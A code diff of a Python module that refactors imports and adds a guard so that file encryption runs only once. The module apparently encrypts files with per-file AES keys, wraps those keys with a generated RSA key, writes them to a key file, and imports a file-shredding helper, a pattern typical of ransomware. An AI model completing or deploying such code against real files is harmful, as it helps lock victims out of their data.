@@ -1,15 +1,16 @@
 import logging
-from symmetric_encryption import AES
-from asymmetric_encryption import RSA
+from os import path
+from core.crypto.symmetric_encryption import AES
+from core.crypto.asymmetric_encryption import RSA
 from os import urandom
-from config import (
+from core.config import (
     AES_SECRET_KEY_SIZE_IN_BYTES,
     AES_INITIALIZATION_VECTOR_SIZE_IN_BYTES,
     ENCRYPTED_FILE_EXTENSION,
     LOCAL_PUBLIC_KEY,
     ENCRYPTED_AES_KEY_FILE_LOCATION,
 )
-from utils import (
+from core.utils import (
     read_data_from_file,
     write_data_to_file,
     shred_file,
@@ -57,20 +58,23 @@ def encrypt_file_details(
 
 
 def start_encryption(file_paths):
-    logger.info("Encryption started")
-    LOCAL_PUBLIC_KEY[0] = generate_rsa_key_pair()
-    list_of_file_encryption_details = [detail for detail in encrypt_files(file_paths)]
-    encrypted_file_encryption_details = [
-        encrypt_file_details(
-            file_encryption_detail.get("aes_secret_key"),
-            file_encryption_detail.get("aes_initialization_vector"),
-            file_encryption_detail.get("encrypted_file_path"),
+    if not path.exists(ENCRYPTED_AES_KEY_FILE_LOCATION):
+        logger.info("Encryption started")
+        LOCAL_PUBLIC_KEY[0] = generate_rsa_key_pair()
+        list_of_file_identifiers = [detail for detail in encrypt_files(file_paths)]
+        encrypted_file_identifiers = [
+            encrypt_file_details(
+                file_identifier.get("aes_secret_key"),
+                file_identifier.get("aes_initialization_vector"),
+                file_identifier.get("encrypted_file_path"),
+            )
+            for file_identifier in list_of_file_identifiers
+        ]
+        write_data_to_file(
+            ENCRYPTED_AES_KEY_FILE_LOCATION,
+            encrypted_file_identifiers,
+            serialized=False,
         )
-        for file_encryption_detail in list_of_file_encryption_details
-    ]
-    write_data_to_file(
-        ENCRYPTED_AES_KEY_FILE_LOCATION,
-        encrypted_file_encryption_details,
-        serialized=False,
-    )
+    else:
+        logger.info("Encryption has already happened")
 
